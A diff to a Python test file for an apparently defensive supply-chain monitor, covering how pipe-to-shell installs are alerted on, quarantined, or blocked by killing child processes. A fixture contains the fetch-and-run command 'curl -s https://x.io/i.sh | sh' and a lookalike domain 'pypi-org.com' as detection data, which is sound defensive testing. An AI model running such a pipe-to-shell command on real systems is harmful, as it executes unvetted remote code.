@@ -229,14 +229,16 @@ def test_supply_exec_event_alerts_install(tmp_path, monkeypatch):
     assert db.execute("SELECT flags FROM dns WHERE name='pypi-org.com'").fetchone()[0] == "dns_lookalike"
 
 
-def test_pipe_to_shell_blocked_and_quarantined_by_default(tmp_path, monkeypatch):
+def _pipe_run(tmp_path, monkeypatch, **kw):
     monkeypatch.setattr(pkgcheck, "check", lambda *a, **k: [])
     proc = fake_proc(tmp_path, {30: (1, "/usr/bin/node /usr/local/bin/opencode run")})
+    os.makedirs(f"{proc}/32/task/32", exist_ok=True)
+    with open(f"{proc}/32/task/32/children", "w") as f:
+        f.write("33 34 ")
     qdir = tmp_path / "quarantine"
     sp = supply.Supply(ebpf=False, inventory_every=0, pkg_checks=True, use_sieve=False, rdap=False, matcher=None,
-                       proc=proc, quarantine_dir=str(qdir))
+                       proc=proc, quarantine_dir=str(qdir), **kw)
     killed = []
-    monkeypatch.setattr(os, "getpgid", lambda pid: pid)
     monkeypatch.setattr(os, "killpg", lambda pg, sig: killed.append(("killpg", pg, sig)))
     monkeypatch.setattr(os, "kill", lambda pid, sig: killed.append(("kill", pid, sig)))
 
@@ -253,12 +255,27 @@ def test_pipe_to_shell_blocked_and_quarantined_by_default(tmp_path, monkeypatch)
     got = []
     sp.handle_events(db, 100, lambda reason, **kw: got.append((reason, kw["dest"], kw["detail"])),
                      lambda *a: None)
-    assert any(r == "pipe_to_shell" and "blocked" in d for r, _, d in got)
-    assert ("killpg", 32, signal.SIGKILL) in killed
+    return got, killed, qdir
+
+
+def test_pipe_to_shell_alerts_and_keeps_payload_by_default(tmp_path, monkeypatch):
+    monkeypatch.setattr(supply.config, "block_pipe_to_shell", lambda: False)
+    got, killed, qdir = _pipe_run(tmp_path, monkeypatch)
+    assert any(r == "pipe_to_shell" and "blocked" not in d for r, _, d in got)
+    assert killed == []
     qfiles = list(qdir.iterdir())
-    assert len(qfiles) == 1
+    assert len(qfiles) == 1 and (qfiles[0].stat().st_mode & 0o777) == 0o600
     body = qfiles[0].read_text()
     assert "https://x.io/i.sh" in body and "curl -s https://x.io/i.sh | sh" in body
+
+
+def test_pipe_to_shell_block_kills_the_pipe_not_the_group(tmp_path, monkeypatch):
+    got, killed, _ = _pipe_run(tmp_path, monkeypatch, block_pipe_to_shell=True)
+    assert any(r == "pipe_to_shell" and "blocked" in d for r, _, d in got)
+    assert not any(k[0] == "killpg" for k in killed)
+    pids = [k[1] for k in killed]
+    assert sorted(pids) == [32, 33, 34] and pids[-1] == 32   # children first, then the pipe's shell
+    assert all(k[2] == signal.SIGKILL for k in killed)
 
 
 # ---------------------------------------------------------------- query
